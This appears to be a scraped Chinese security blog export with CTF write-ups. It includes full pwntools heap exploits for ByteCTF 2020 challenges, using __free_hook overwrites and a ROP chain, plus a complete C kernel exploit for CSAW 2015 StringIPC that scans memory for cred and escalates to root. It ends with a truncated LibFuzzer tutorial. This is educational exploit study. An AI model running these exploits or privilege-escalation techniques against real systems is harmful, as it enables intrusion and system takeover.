123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110from pwn import *# context.log_level='debug'context.arch='amd64'def cmd(command): p.recvuntil(&quot;&gt; &quot;) p.sendline(str(command))def shoot(time): cmd(1) p.recvuntil(&quot;: &quot;) p.sendline(str(time))def load(idx): cmd(2) p.recvuntil(&quot;?&quot;) p.sendline(str(idx))def add(size,content): cmd(3) p.recvuntil(&quot;: &quot;) p.sendline(str(size)) p.recvuntil(&quot;: &quot;) p.sendline(content)def main(host,port=30772): global p if host: p=remote(host,port) else: p=process(&quot;./gun&quot;) p.recvuntil(&quot;: &quot;) p.sendline('1234') add(0x60,'a'*8) add(0x500,'b'*8) add(0x60,'c'*8) load(1) load(0) shoot(1) add(0x60,'d'*8) shoot(1) load(0) shoot(1) add(0x60,'d'*8) add(0x60,'e'*8) shoot(1) p.recvuntil(&quot;e&quot;*8) libc.address=u64(p.recvuntil(&quot;\\x7f&quot;)[-6:].ljust(8,b'\\x00'))-0x1ec010 success(&quot;libc: &quot;+hex(libc.address)) for i in range(8): add(0x60,'f'*0x10) load(1) shoot(1) p.recvuntil(&quot;f&quot;*0x10) heap_addr=u64(p.recv(6).ljust(8,b'\\x00'))-0x330 success(&quot;heap: &quot;+hex(heap_addr)) add(0x60,'a'*8) load(2) load(3) load(4) load(5) load(6) load(7) load(8) shoot(7) load(1) shoot(1) load(0) shoot(2) for i in range(7): add(0x60,'a'*8) add(0x60,p64(libc.sym['__free_hook'])) add(0x60,'a') add(0x60,'a') add(0x60,p64(libc.address+0x0000000000154930)) # gdb.attach(p,&quot;b free\\nc&quot;) p_rdi=0x0000000000026b72+libc.address p_rsi=0x0000000000027529+libc.address p_rdx_r12=0x000000000011c371+libc.address p_rax=0x000000000004a550+libc.address syscall_ret=0x0000000000066229+libc.address payload = b&quot;/flag\\x00\\x00\\x00&quot;+p64(heap_addr+0x6c0) payload += b&quot;\\x00&quot;*0x10+p64(libc.sym[&quot;setcontext&quot;]+61) payload += p64(0)*8 #offset 0x68 payload += p64(0) #rdi payload += p64(heap_addr+0x6c0+0xa8) #rsi payload += p64(heap_addr+0x2000) #rbp payload += p64(0x200)*2 #rbx and rdx payload += p64(0)*2 payload += p64(heap_addr+0x6c0+0xa8) # rsp payload += p64(p_rax) #rcx payload += p64(p_rax) payload += p64(0)+p64(syscall_ret) add(0x180,payload) load(12) shoot(1) pause() rop_chain = [ p_rdi,heap_addr+0x6c0,p_rdx_r12,0,0,p_rsi,0,p_rax,2,syscall_ret, p_rdi,3,p_rdx_r12,0x100,0,p_rsi,heap_addr+0x2000,p_rax,0,syscall_ret, p_rdi,1,p_rax,1,syscall_ret ] p.send(b&quot;A&quot;*0x20+flat(rop_chain)) p.interactive()if __name__ == '__main__': libc=ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;) main(&quot;123.57.209.176&quot;) easyheap这道是ruan师傅做的，我赛后复现了一下 经典菜单题，洞在add里： 1234567891011121314151617181920212223242526272829303132333435 printf(&quot;Size: &quot;); __isoc99_scanf(&quot;%hd&quot;, &amp;size); // %hd 表示为短整型2个字节 v2 = size; if ( size &lt;= 0 || size &gt; 0x80 ) { do { do { puts(&quot;Invalid size.&quot;); printf(&quot;Size: &quot;); __isoc99_scanf(&quot;%hd&quot;, &amp;size); } while ( size &lt;= 0 ); } while ( size &gt; 0x80 ); } else { v2 = size; } ptr = malloc(size); if ( !ptr ) { puts(&quot;Malloc error.&quot;); exit(2); } memset(ptr, 0, size); printf(&quot;Content: &quot;); read_n((__int64)ptr, size); // v2是第一次输入的sz *((_BYTE *)ptr + v2 - 1) = 0; *((_DWORD *)&amp;unk_4060 + 4 * i) = size; heaplist[2 * i] = ptr; puts(&quot;Finish.&quot;);} 可以看到，v2是第一次输入的size，如果这个size是不符合条件的，就能在执行*((_BYTE *)ptr + v2 - 1) = 0;时向上写入一个’\\0’，可以用来改bin的fd，以构造overlop。 leak是先构造tecache_dup（即一个bin既在tecache，又在fastbin，利用的就是上面的思路）通过触发malloc_consoildate将fastbin放入unsoretdbin，从而leak main_arena。 1234567891011121314151617181920add(0x50,'a'*8)dele(0)for i in range(8): add(0x40,'a'*8)for i in range(1,8): dele(i)dele(0)cmd(1)p.recvuntil(&quot;: &quot;)p.sendline(str(0x10000-0xf0+1))add_(0x40,&quot;b&quot;*8)for i in range(3): add(0x40,'a'*8)add(0x40,p64(0))p.recvuntil(&quot;&gt;&gt; &quot;)p.sendline(&quot;1&quot;*0x400)show(4)offset=0x1ebc20p.recvuntil(&quot;: &quot;)libc.address = u64(p.recvuntil(&quot;\\n&quot;)[:-1].ljust(8,b'\\x00'))-offset 之后还是上面的思路构造overlop。通过改fd的低字节为’\\x00’使得chunk-&gt;fd指向的地址在chunk下面（距离小于chunk的size），导致overlop。 之后tecache attack打free_hook。 exp： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889from pwn import *context.log_level='debug'context.arch='amd64'def cmd(command): p.recvuntil(&quot;&gt;&gt; &quot;) p.sendline(str(command))def add(sz,content): cmd(1) p.recvuntil(&quot;: &quot;) p.sendline(str(sz)) p.recvuntil(&quot;: &quot;) p.sendline(content)def add_(sz,content): p.recvuntil(&quot;: &quot;) p.sendline(str(sz)) p.recvuntil(&quot;: &quot;) p.sendline(content)def show(idx): cmd(2) p.recvuntil(&quot;Index: &quot;) p.sendline(str(idx))def dele(idx): cmd(3) p.recvuntil(&quot;Index: &quot;) p.sendline(str(idx))def main(host, port = 1234): global p if host: p = remote(host, port) else: p = process(&quot;./easyheap&quot;) add(0x50,'a'*8) dele(0) for i in range(8): add(0x40,'a'*8) for i in range(1,8): dele(i) dele(0) cmd(1) p.recvuntil(&quot;: &quot;) p.sendline(str(0x10000-0xf0+1)) add_(0x40,&quot;b&quot;*8) for i in range(3): add(0x40,'a'*8) add(0x40,p64(0)) p.recvuntil(&quot;&gt;&gt; &quot;) p.sendline(&quot;1&quot;*0x400) show(4) offset=0x1ebc20 p.recvuntil(&quot;: &quot;) libc.address = u64(p.recvuntil(&quot;\\n&quot;)[:-1].ljust(8,b'\\x00'))-offset success(&quot;libc: &quot;+hex(libc.address)) for i in range(4): dele(i) add(0x30,'a'*8) add(0x60,'a'*8) dele(1) cmd(1) p.recvuntil(&quot;: &quot;) p.sendline(str(0x10000-0xa0+1)) add_(0x60,&quot;a&quot;*8) dele(1) for _ in range(2): add(0x40,'a') payload=b'a'*0x10+p64(0)+p64(0x51)+p64(libc.sym['__free_hook']) add(0x40,payload) add(0x40,'/bin/sh') add(0x40,p64(libc.sym['system'])) dele(5) gdb.attach(p) p.interactive()if __name__ == &quot;__main__&quot;: libc=ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;) main(0) QIAO这题肝了好久，并不是它难，而是吃了逆向经验匮乏的亏。首先这题花指令很多”jmp $+5”导致ida无法反编译，那就直接上手调了。main函数开始先把一个大数放入stack里： 1mov dword ptr [rbp-34h], 0B63C9FE1h 之后通过调试会不断的将这个数和其他的数进行比较，相等的话就跳转。 1234567891011121314 mov eax, [rbp-38h].text:00000000004019FD sub eax, 0B63C9FE1h.text:0000000000401A02 mov [rbp-50h], eax.text:0000000000401A05 jz loc_401ADB.text:0000000000401A0B jmp $+5 loc_401ADB: ; CODE XREF: .text:0000000000401A05↑j.text:0000000000401ADB mov eax, 501DC785h.text:0000000000401AE0 mov ecx, 44AF965Fh.text:0000000000401AE5 mov edx, [rbp-4].text:0000000000401AE8 cmp edx, 2.text:0000000000401AEB cmovnz eax, ecx.text:0000000000401AEE mov [rbp-34h], eax.text:0000000000401AF1 jmp loc_401DA7 这个跳转到loc_401ADB进行的是比较的操作，分析得是对argc的检查，如果为2就通过。 之后更新这个大数为501DC785h，并继续和其他数比较，相等的话就跳转。 1234567891011121314151617181920.text:0000000000401A94 mov eax, [rbp-38h].text:0000000000401A97 sub eax, 501DC785h.text:0000000000401A9C mov [rbp-6Ch], eax.text:0000000000401A9F jz loc_401B1D.text:0000000000401AA5 jmp $+5.text:0000000000401B1D loc_401B1D: ; CODE XREF: .text:0000000000401A9F↑j.text:0000000000401B1D mov eax, 874FBE3Fh.text:0000000000401B22 mov ecx, 0B6DAB60Eh.text:0000000000401B27 mov rdx, [rbp-28h].text:0000000000401B2B mov rdi, [rdx+8].text:0000000000401B2F mov [rbp-7Ch], eax.text:0000000000401B32 mov [rbp-80h], ecx.text:0000000000401B35 call _strlen.text:0000000000401B3A cmp rax, 20h ; ' '.text:0000000000401B3E mov ecx, [rbp-7Ch].text:0000000000401B41 mov esi, [rbp-80h].text:0000000000401B44 cmovnz ecx, esi.text:0000000000401B47 mov [rbp-34h], ecx.text:0000000000401B4A jmp loc_401DA7 跳到loc_401B1D，call了strlen，完成的是对args的长度进行比较，为0x20即通过。 大数更新为874FBE3Fh，之后再比较跳到了： 123456789101112131415.text:0000000000401B79 loc_401B79: ; CODE XREF: .text:0000000000401997↑j.text:0000000000401B79 mov eax, 8F7A1A66h.text:0000000000401B7E mov ecx, 2D33904h.text:0000000000401B83 mov dword ptr [rbp-10h], 1BDh.text:0000000000401B8A mov dword ptr [rbp-14h], 63h ; 'c'.text:0000000000401B91 mov edx, [rbp-10h].text:0000000000401B94 mov esi, [rbp-14h].text:0000000000401B97 imul edx, edx.text:0000000000401B9A add edx, 1.text:0000000000401B9D imul esi, esi.text:0000000000401BA0 imul esi, 7.text:0000000000401BA3 cmp edx, esi.text:0000000000401BA5 cmovz eax, ecx.text:0000000000401BA8 mov [rbp-34h], eax.text:0000000000401BAB jmp loc_401DA7 感觉啥也没干，就更新了大数为8F7A1A66h，再跳： 12345678910111213.text:0000000000401C0C loc_401C0C: ; CODE XREF: .text:00000000004019C3↑j.text:0000000000401C0C mov rax, [rbp-28h].text:0000000000401C10 mov rdi, [rax+8].text:0000000000401C14 call sub_401180.text:0000000000401C19 mov [rbp-30h], rax.text:0000000000401C1D mov rdi, [rbp-30h].text:0000000000401C21 call sub_4018C0.text:0000000000401C26 mov ecx, 0BC6F950Fh.text:0000000000401C2B mov edx, 3B7E9E40h.text:0000000000401C30 cmp eax, 0.text:0000000000401C33 cmovnz ecx, edx.text:0000000000401C36 mov [rbp-34h], ecx.text:0000000000401C39 jmp loc_401DA7 这个地方是关键部分。 一般这种要我们输入的逆向题会对我们的输入进行变形，然后进行比较，经分析发现sub_401180完成的就是对输入进行变形。 如我们输入’a’*0x20,内存中’a’占1个字节，而变形后’a’表是16进制的0xa，只占4bit，从而变形为长度为0x10的’aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa’(内存中)。 123pwndbg&gt; x/20gx 0x4242900x424290: 0x0000000000000000 0x00000000000000210x4242a0: 0xaaaaaaaaaaaaaaaa 0xaaaaaaaaaaaaaaaa 而sub_4018C0理论上应该是比较函数，而且分析发现函数的返回后eax会和1比较，为1就表示通过。但这个函数反编译后十分复杂，感觉不像人写的，所以我直接放放弃静态分析（实际上静态分析了好久分析了个寂寞）。 通过调试发现sub_4018C0执行完后会释放一个堆块，而且堆中多了好多奇怪的内容，并且和我们的输入没有关系。于是我猜测就是和堆里的内容比较，于是在free下断得到堆里的数据为7fa392e666d78abbb655165528fff33f（经过大小端变换后的） 123pwndbg&gt; x/20gx 0x4242b0 //将要free的堆0x4242b0: 0x0000000000000000 0x00000000000000210x4242c0: 0xbb8ad766e692a37f 0x3ff3ff28551655b6 将其作为输入果然返回为1，之后就顺利拿到flag了。🚩 还有一道go的pwn题还没复现好，之后会单独写一篇，ruan师傅tql✨ 这场比赛打下来收获颇多，但看着大把的安卓逆向实属难受，其实我们堆的pwn和web解出的题目数量和前面的队伍差不多的，主要吃亏在re,crypto和misc，说到底还是自己不够强。keep it up🐱‍👤","link":"/2020/10/26/ByteCTF2020%E5%88%9D%E8%B5%9B/"},{"title":"kernel_pwn SringsIPC(P1)","text":"Kernel_pwn SringsIPC(P1) 从任意地址读写到提权的三种方法：1.修改cred结构体2.改写vdso映射函数+反弹shell3.劫持prctl执行过程的hp-&gt;hook指针 这道题来自csaw-2015-ctf也是一道经典的内核题了，花了蛮久的时间去复现🤦 这题只给了程序的源代码main.c，需要我们自己搭建环境。我是懒狗，直接用了p4nda师傅的镜像和文件系统（十分感谢！😍）。根据题目的名字猜测可能是实现了进程间通信过程中的的信箱机制（正好最近在做操作系统的IPC实验），但实际上是我想多了。 分析源码发现程序实现了对一片内存区域的申请，释放，读写，扩容，查寻操作。漏洞点在扩容操作(realloc)函数中： 1234567891011121314151617181920212223242526static int realloc_ipc_channel ( struct ipc_state *state, int id, size_t size, int grow ){ struct ipc_channel *channel; size_t new_size; char *new_data; channel = get_channel_by_id(state, id); if ( IS_ERR(channel) ) return PTR_ERR(channel); if ( grow ) new_size = channel-&gt;buf_size + size; else new_size = channel-&gt;buf_size - size; new_data = krealloc(channel-&gt;data, new_size + 1, GFP_KERNEL); if ( new_data == NULL ) return -EINVAL; channel-&gt;data = new_data; channel-&gt;buf_size = new_size; ipc_channel_put(state, channel); return 0;} krealloc函数new_size是由channel-&gt;buf_size-size得到的，这两个值都可控，从而可以使得new_size+1==0。根据krealloc函数源码： 12345678910111213141516171819202122232425262728/** * krealloc - reallocate memory. The contents will remain unchanged. * @p: object to reallocate memory for. * @new_size: how many bytes of memory are required. * @flags: the type of memory to allocate. * * The contents of the object pointed to are preserved up to the * lesser of the new and old sizes. If @p is %NULL, krealloc() * behaves exactly like kmalloc(). If @new_size is 0 and @p is not a * %NULL pointer, the object pointed to is freed. * * Return: pointer to the allocated memory or %NULL in case of error */void *krealloc(const void *p, size_t new_size, gfp_t flags){ void *ret; if (unlikely(!new_size)) { kfree(p); return ZERO_SIZE_PTR; } ret = __do_krealloc(p, new_size, flags); if (ret &amp;&amp; kasan_reset_tag(p) != kasan_reset_tag(ret)) kfree(p); return ret;} 如果传入的size为0，会返回ZERO_SIZE_PTR(#define ZERO_SIZE_PTR ((void *)16))，即为0x10(而不是0!!!)，此时有： 12channel-&gt;buf_size = new_size == 0x10channel-&gt;buf_size = new_size == 0xffffffffffffffff(size_t无符号) 如果将channel-&gt;index赋值为target_addr-0x10，根据read/write的功能可以绕过size的限制从而实现任意地址读写🙌。 利用方法可以任意地址读写了，要如何提权呢？共学到了三种姿势 1.修改进程cred结构体做过了babydriver那题就比较容易想到的要修改cred结构体了，但要怎么找到cred的地址呢？虽然我们已经可以任意地址读了，但要读哪里才能读到cred呢？头大。。。看了raycp师傅的博客学到了寻找cred结构体的方法tql！。首先线程由于要使用所属进程的资源，在其thread_info结构块中有一个struct task_struct类型的结构体，其内容为： 1234567891011121314struct task_struct {.../* process credentials */conststruct cred __rcu *ptracer_cred; /* Tracer's credentials at attach */conststruct cred __rcu *real_cred; /* objective and real subjective task* credentials (COW) */conststruct cred __rcu *cred; /* effective (overridable) subjective task* credentials (COW) */char comm[TASK_COMM_LEN]; /* executable name excluding path- access with[gs]et_task_comm (which lock it with task_lock())- initialized normally by setup_new_exec */...}; 可以看到我们所关心的conststruct cred __rcu *cred; conststruct cred __rcu *real_cred;,还有一个重要的地方在于char comm[TASK_COMM_LEN];，这个字符数组保存了进程的名字，也为我们寻找cred提供了方法。首先，task_struct所需的内存是动态分配得到的，我们知道通过kmem_cache_alloc_node函数申请的空间是在内核的动态分配区域。通过下面的内核映射空间可以确定爆破的范围在0xffff880000000000~0xffffc80000000000。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081820xffffffffffffffff ---+-----------+-----------------------------------------------+-------------+ | | |+++++++++++++| 8M | | unused hole |+++++++++++++| | | |+++++++++++++|0xffffffffff7ff000 ---|-----------+------------| FIXADDR_TOP |--------------------|+++++++++++++| 1M | | |+++++++++++++|0xffffffffff600000 ---+-----------+------------| VSYSCALL_ADDR |------------------|+++++++++++++| 548K | | vsyscalls |+++++++++++++|0xffffffffff577000 ---+-----------+------------| FIXADDR_START |------------------|+++++++++++++| 5M | | hole |+++++++++++++|0xffffffffff000000 ---+-----------+------------| MODULES_END |--------------------|+++++++++++++| | | |+++++++++++++| 1520M | | module mapping space (MODULES_LEN) |+++++++++++++| | | |+++++++++++++|0xffffffffa0000000 ---+-----------+------------| MODULES_VADDR |------------------|+++++++++++++| | | |+++++++++++++| 512M | | kernel text mapping, from phys 0 |+++++++++++++| | | |+++++++++++++|0xffffffff80000000 ---+-----------+------------| __START_KERNEL_map |-------------|+++++++++++++| 2G | | hole |+++++++++++++|0xffffffff00000000 ---+-----------+-----------------------------------------------|+++++++++++++| 64G | | EFI region mapping space |+++++++++++++|0xffffffef00000000 ---+-----------+-----------------------------------------------|+++++++++++++| 444G | | hole |+++++++++++++|0xffffff8000000000 ---+-----------+-----------------------------------------------|+++++++++++++| 16T | | %esp fixup stacks |+++++++++++++|0xffffff0000000000 ---+-----------+-----------------------------------------------|+++++++++++++| 3T | | hole |+++++++++++++|0xfffffc0000000000 ---+-----------+-----------------------------------------------|+++++++++++++| 16T | | kasan shadow memory (16TB) |+++++++++++++|0xffffec0000000000 ---+-----------+-----------------------------------------------|+++++++++++++| 1T | | hole |+++++++++++++|0xffffeb0000000000 ---+-----------+-----------------------------------------------| kernel space| 1T | | virtual memory map for all of struct pages |+++++++++++++|0xffffea0000000000 ---+-----------+------------| VMEMMAP_START |------------------|+++++++++++++| 1T | | hole |+++++++++++++|0xffffe90000000000 ---+-----------+------------| VMALLOC_END |------------------|+++++++++++++| 32T | | vmalloc/ioremap (1 &lt;&lt; VMALLOC_SIZE_TB) |+++++++++++++|0xffffc90000000000 ---+-----------+------------| VMALLOC_START |------------------|+++++++++++++| 1T | | hole |+++++++++++++|0xffffc80000000000 ---+-----------+-----------------------------------------------|+++++++++++++| | | |+++++++++++++| | | |+++++++++++++| | | |+++++++++++++| | | |+++++++++++++| | | |+++++++++++++| | | |+++++++++++++| | | |+++++++++++++| | | |+++++++++++++| | | |+++++++++++++| | | |+++++++++++++| 64T | | direct mapping of all phys. memory |+++++++++++++| | | (1 &lt;&lt; MAX_PHYSMEM_BITS) |+++++++++++++| | | |+++++++++++++| | | |+++++++++++++| | | |+++++++++++++| | | |+++++++++++++| | | |+++++++++++++| | | |+++++++++++++| | | |+++++++++++++| | | |+++++++++++++| | | |+++++++++++++|0xffff880000000000 ----+-----------+-----------| __PAGE_OFFSET_BASE | -------------|+++++++++++++| | | |+++++++++++++| 8T | | guard hole, reserved for hypervisor |+++++++++++++| | | |+++++++++++++|0xffff800000000000 ----+-----------+-----------------------------------------------+-------------+ |-----------| |-------------| |-----------| hole caused by [48:63] sign extension |-------------| |-----------| |-------------|0x0000800000000000 ----+-----------+-----------------------------------------------+-------------+ PAGE_SIZE | | guard page |xxxxxxxxxxxxx|0x00007ffffffff000 ----+-----------+--------------| TASK_SIZE_MAX | ---------------|xxxxxxxxxxxxx| | | | user space | | | |xxxxxxxxxxxxx| | | |xxxxxxxxxxxxx| | | |xxxxxxxxxxxxx| 128T | | different per mm |xxxxxxxxxxxxx| | | |xxxxxxxxxxxxx| | | |xxxxxxxxxxxxx| | | |xxxxxxxxxxxxx|0x0000000000000000 ----+-----------+-----------------------------------------------+-------------+ 还有这里介绍一个关键的函数int prctl( int option,unsigned long arg2,unsigned long arg3,unsigned long arg4,unsigned long arg5 )，这是一个系统函数，是为进程制定而设计的。内核对应的处理函数为SYSCALL_DEFINE5()。其中第一个参数option指定操作类型，如指定PR_SET_NAME，即设置进程名，之后的参数即为补充参数。因此我们可以通过执行prctl(PR_SET_NAME,target)即可完成对进程名的设定。 因此利用方法就很明确了：1.prctl函数设置进程明。2.利用ioctl(fd,CSAW_SHRINK_CHANNEL,&amp;shrink_channel)触发漏洞(channel-&gt;date=0x10 channel-&gt;buf_size=0xffffffffffffffff)。3.利用任意地址读在0xffff880000000000~0xffffc80000000000范围内利用memmem()函数寻找进程名字符串char comm[TASK_COMM_LEN]。4.找到cred地址后利用任意地址写修改uidgid为0 触发漏洞：call krealloc时寄存器状态： 1234567891011121314151617$rax : 0xffffffffffffffff$rbx : 0xffff88001f9411e0 → 0x0000000100000002 → 0x0000000100000002$rcx : 0x0000000000000000 → 0x0000000000000000$rdx : 0x00000000024000c0 → 0x00000000024000c0$rsp : 0xffff88001f9e3e28 → 0xffff88001f9c5908 → 0x0000000000000000 → 0x0000000000000000$rbp : 0xffff88001f9e3e48 → 0xffff88001f9e3e98 → 0xffff88001f9e3f08 → 0xffff88001f9e3f48 → 0x00007fffde817950 → 0x0000000000401c70 → 0x2b54c73d8d4c5741 → 0x2b54c73d8d4c5741$rsi : 0x0000000000000000 → 0x0000000000000000 //new_size$rdi : 0xffff88001fa10a00 → 0x0000000000000000 → 0x0000000000000000$rip : 0xffffffffc00001a6 → 0xc08548c11a1355e8 → 0xc08548c11a1355e8$r8 : 0x0000000000000101 → 0x0000000000000101$r9 : 0x0000000000000000 → 0x0000000000000000$r10 : 0x0000000000000000 → 0x0000000000000000$r11 : 0x0000000000000000 → 0x0000000000000000$r12 : 0xffffffffffffffff$r13 : 0x0000000000000101 → 0x0000000000000101$r14 : 0x0000000000000000 → 0x0000000000000000$r15 : 0x00007fffde817890 → 0x00007fff00000001 → 0x00007fff00000001 返回值$rax : 0x0000000000000010 → 0x0000000000000010 赋值时： 12345→ 0xffffffffc00001b0 &lt;realloc_ipc_channel.isra+80&gt; mov QWORD PTR [rbx+0x8], rax 0xffffffffc00001b4 &lt;realloc_ipc_channel.isra+84&gt; mov QWORD PTR [rbx+0x10], r12$rax : 0x0000000000000010 → 0x0000000000000010$r12 : 0xffffffffffffffff 寻找cred: 123456789101112131415161718192021222324 for(;addr &lt; 0xffffc80000000000;addr += 0x1000){ seek_channel.id = alloc_channel.id; seek_channel.index = addr-0x10; seek_channel.whence = SEEK_SET; ioctl(fd,CSAW_SEEK_CHANNEL,&amp;seek_channel); read_channel.id = alloc_channel.id; read_channel.buf = buf; read_channel.count = 0x1000; ioctl(fd,CSAW_READ_CHANNEL,&amp;read_channel); result = memmem(buf,0x1000,target,16); if (result) { cred = *(size_t *)(result - 0x8); real_cred = *(size_t *)(result - 0x10); if( (cred||0xff00000000000000) &amp;&amp; (real_cred == cred)){ //printf(&quot;[]%lx[]&quot;,result-(int)(buf)); target_addr = addr + result-(int)(buf); printf(&quot;[+]found task_struct 0x%lx\\n&quot;,target_addr); printf(&quot;[+]found cred 0x%lx\\n&quot;,real_cred); break; } }} 调试： 1234567891011121314gef➤ x/40gx 0xffff8800002034c0-0x30 //task_struct0xffff880000203490: 0xffff880019788968 0xffff8800197889780xffff8800002034a0: 0xffff880019788978 0x00000000000000000xffff8800002034b0: 0xffff88001f9c2600 0xffff88001f9c2600 //cred_addr0xffff8800002034c0: 0x3939393939396e61 0x00616c6539393939 //comm0xffff8800002034d0: 0x0000000000000000 0x0000000000000000gef➤ x/30gx 0xffff88001f9c2600 //cred0xffff88001f9c2600: 0xffff88001f9c2900 0x000003e8000003e80xffff88001f9c2610: 0x000003e8000003e8 0x000003e8000003e80xffff88001f9c2620: 0x00000000000003e8 0x00000000000000000xffff88001f9c2630: 0x0000000000000000 0x00000000000000000xffff88001f9c2640: 0x0000003fffffffff 0x00000000000000000xffff88001f9c2650: 0x0000000000000000 0x0000000000000000 改写cred: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150for(int i=0;i&lt;44;i++){ seek_channel.id = alloc_channel.id; seek_channel.index = cred-0x10+4+i; seek_channel.whence = SEEK_SET; ioctl(fd,CSAW_SEEK_CHANNEL,&amp;seek_channel); root_cred[0]=0; write_channel.id = alloc_channel.id; write_channel.count= 1; write_channel.buf = (char*)root_cred; ioctl(fd,CSAW_WRITE_CHANNEL,&amp;write_channel); }完整exp:```c#include &lt;stdio.h&gt;#include &lt;sys/prctl.h&gt;#include &lt;sys/types.h&gt;#include &lt;sys/stat.h&gt;#include &lt;fcntl.h&gt;#include &lt;string.h&gt;#define CSAW_IOCTL_BASE 0x77617363#define CSAW_ALLOC_CHANNEL CSAW_IOCTL_BASE+1#define CSAW_OPEN_CHANNEL CSAW_IOCTL_BASE+2#define CSAW_GROW_CHANNEL CSAW_IOCTL_BASE+3#define CSAW_SHRINK_CHANNEL CSAW_IOCTL_BASE+4#define CSAW_READ_CHANNEL CSAW_IOCTL_BASE+5#define CSAW_WRITE_CHANNEL CSAW_IOCTL_BASE+6#define CSAW_SEEK_CHANNEL CSAW_IOCTL_BASE+7#define CSAW_CLOSE_CHANNEL CSAW_IOCTL_BASE+8struct alloc_channel_args { size_t buf_size; int id;};struct open_channel_args { int id;};struct shrink_channel_args { int id; size_t size;};struct read_channel_args { int id; char *buf; size_t count;};struct write_channel_args { int id; char *buf; size_t count;};struct seek_channel_args { int id; loff_t index; int whence;};struct close_channel_args { int id;};int main(){ struct alloc_channel_args alloc_channel; struct shrink_channel_args shrink_channel; struct seek_channel_args seek_channel; struct read_channel_args read_channel; struct write_channel_args write_channel; struct close_channel_args close_channel; int fd = -1; u_int64_t addr = 0xffff880000000000; u_int64_t real_cred = 0; u_int64_t cred = 0; u_int64_t target_addr; u_int64_t result = 0; int root_cred[12]; setvbuf(stdout,0,2,0); char *buf = malloc(0x1000); char target[16]; strcpy(target,&quot;an9999999999ela&quot;); prctl(PR_SET_NAME,target); fd = open(&quot;/dev/csaw&quot;,O_RDWR); if(fd&lt;0){ perror(&quot;open error&quot;); } alloc_channel.buf_size = 0x100; alloc_channel.id = -1; ioctl(fd,CSAW_ALLOC_CHANNEL,&amp;alloc_channel); if(alloc_channel.id == -1){ perror(&quot;alloc error&quot;); } printf(&quot;[+] you have got a channel %d\\n&quot;,alloc_channel.id); shrink_channel.id = alloc_channel.id; shrink_channel.size = 0x101; ioctl(fd,CSAW_SHRINK_CHANNEL,&amp;shrink_channel); //channel-&gt;date=0x10 channel-&gt;buf_size=0xffffffffffffffff printf(&quot;[+] now we can read and write any mem\\n&quot;); for(;addr &lt; 0xffffc80000000000;addr += 0x1000){ seek_channel.id = alloc_channel.id; seek_channel.index = addr-0x10; seek_channel.whence = SEEK_SET; ioctl(fd,CSAW_SEEK_CHANNEL,&amp;seek_channel); read_channel.id = alloc_channel.id; read_channel.buf = buf; read_channel.count = 0x1000; ioctl(fd,CSAW_READ_CHANNEL,&amp;read_channel); result = memmem(buf,0x1000,target,16); if (result) { cred = *(size_t *)(result - 0x8); real_cred = *(size_t *)(result - 0x10); if( (cred||0xff00000000000000) &amp;&amp; (real_cred == cred)){ //printf(&quot;[]%lx[]&quot;,result-(int)(buf)); target_addr = addr + result-(int)(buf); printf(&quot;[+]found task_struct 0x%lx\\n&quot;,target_addr); printf(&quot;[+]found cred 0x%lx\\n&quot;,real_cred); break; } } } if(result == 0){ puts(&quot;not found , try again &quot;); exit(-1); } for(int i=0;i&lt;44;i++){ seek_channel.id = alloc_channel.id; seek_channel.index = cred-0x10+4+i; seek_channel.whence = SEEK_SET; ioctl(fd,CSAW_SEEK_CHANNEL,&amp;seek_channel); root_cred[0]=0; write_channel.id = alloc_channel.id; write_channel.count= 1; write_channel.buf = (char*)root_cred; ioctl(fd,CSAW_WRITE_CHANNEL,&amp;write_channel); } if(getuid() == 0){ printf(&quot;[+] root now \\n&quot;); system(&quot;/bin/sh&quot;); } return 0;} 第一种的解法还算常规，第二三种解法就很骚了，看着p4nda和raycp两位大师傅的博客学的，师傅们tql!🤩,另外两种会单独再写两篇post。周一还有考试，赶紧去复习了😭。","link":"/2020/11/20/kernel_pwn%20%E4%BB%8E%E4%BB%BB%E6%84%8F%E5%9C%B0%E5%9D%80%E7%8B%AC%E5%86%99%E5%88%B0%E6%8F%90%E6%9D%83(1)/"},{"title":"（转）LibFuzzer workshop学习之路（三）","text":"文章首发于安全客，由安全客原创发布：https://www.anquanke.com/post/id/227394 libfuzzer workshop学习之路（三） workshop一共给出了11个lesson，每一个lesson都会涉及到一些新的东西，这篇以最后的两个案例(对re2和pcre2的fuzz)为例，会涉及到一些链接库的选择以及插桩编译时的一些参数的设置，还有max_len的设置对我们最后fuzz结果的影响。 fuzzing pcre2pcre2:Perl Compatible Regular Expressions Version 2(Perl兼容的正则表达式)即是一个C语言编写的正则表达式函数库，被很多开源软件所使用比如PHP，Apache，Nmap等。workshop提供的pcre2版本是10.00，先进行源码编译工作。 123456789tar xzf pcre2-10.00.tgzcd pcre2-10.00./autogen.shexport FUZZ_CXXFLAGS=&quot;-O2 -fno-omit-frame-pointer -gline-tables-only -fsanitize=address,fuzzer-no-link -fsanitize-address-use-after-scope&quot;CXX=&quot;clang++ $FUZZ_CXXFLAGS&quot; CC=&quot;clang $FUZZ_CXXFLAGS&quot; \\ CCLD=&quot;clang++ $FUZZ_CXXFLAGS&quot; ./configure --enable-never-backslash-C \\ --with-match-limit=1000 --with-match-limit-recursion=1000make -j 这里的一些插桩的参数和进阶篇的差不多，要注意的编译选项是fuzzer-no-link，如果修改大型项目的CFLAGS，它也需要编译自己的主符号的可执行文件，则可能需要在不链接的情况下仅请求检测，即fuzzer-no-link强制在链接阶段不生效。因此当我在插桩编译一个较大的开源库的时候推荐加上这个选项，如果不加的话fuzz效率如下： 123456789101112#2 INITED cov: 7 ft: 8 corp: 1/1b exec/s: 0 rss: 27Mb#3 NEW cov: 9 ft: 10 corp: 2/5b lim: 4 exec/s: 0 rss: 27Mb L: 4/4 MS: 1 CrossOver-#7 REDUCE cov: 9 ft: 10 corp: 2/3b lim: 4 exec/s: 0 rss: 28Mb L: 2/2 MS: 4 ChangeByte-CrossOver-ChangeBinInt-EraseBytes-#35 